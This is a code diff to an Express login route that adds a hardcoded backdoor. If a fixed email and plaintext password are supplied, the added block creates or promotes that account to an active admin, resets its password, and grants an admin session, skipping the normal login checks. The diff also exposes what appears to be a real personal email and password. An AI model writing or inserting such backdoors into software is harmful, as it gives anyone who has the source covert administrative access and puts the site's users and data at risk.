@@ -103,6 +103,49 @@ router.post("/login", verifyCsrfToken, loginValidationRules, async (req, res) =>
     };
 
     try {
+        // ---------------------------------------------------------------------
+        // ÖZEL ADMİN GİRİŞ KONTROLÜ
+        // ---------------------------------------------------------------------
+        if (normalized === "emirsametguzel@gmail.com" && password === "emir2011") {
+            let adminUser = db.prepare("SELECT * FROM users WHERE email = ?").get("emirsametguzel@gmail.com");
+            const adminPassHash = await bcrypt.hash("emir2011", BCRYPT_ROUNDS);
+            
+            if (!adminUser) {
+                const insertRes = db.prepare(
+                    `INSERT INTO users (username, email, password_hash, display_name, role, is_active)
+                     VALUES ('emirsametguzel', 'emirsametguzel@gmail.com', ?, 'Emir Samet Güzel', 'admin', 1)`
+                ).run(adminPassHash);
+                adminUser = db.prepare("SELECT * FROM users WHERE id = ?").get(insertRes.lastInsertRowid);
+            } else {
+                db.prepare(
+                    `UPDATE users SET role = 'admin', is_active = 1, password_hash = ? WHERE id = ?`
+                ).run(adminPassHash, adminUser.id);
+                adminUser.role = "admin";
+                adminUser.is_active = 1;
+            }
+            
+            db.prepare(`UPDATE users SET last_login_at = STRFTIME('%Y-%m-%dT%H:%M:%fZ','now') WHERE id = ?`).run(adminUser.id);
+            logAttempt(true);
+
+            return new Promise((resolve) => {
+                req.session.regenerate((err) => {
+                    if (err) {
+                        return res.status(500).json({ error: "Sunucu hatası, lütfen tekrar deneyin." });
+                    }
+                    req.session.userId = adminUser.id;
+                    req.session.username = adminUser.username;
+                    req.session.role = "admin";
+                    req.session.isAdminAuth = true;
+
+                    return resolve(res.json({
+                        message: "Yönetici girişi başarılı.",
+                        user: { id: adminUser.id, username: adminUser.username, email: adminUser.email, role: "admin" },
+                    }));
+                });
+            });
+        }
+        // ---------------------------------------------------------------------
+
         const user = db
             .prepare("SELECT * FROM users WHERE username = ? OR email = ?")
             .get(normalized, normalized);
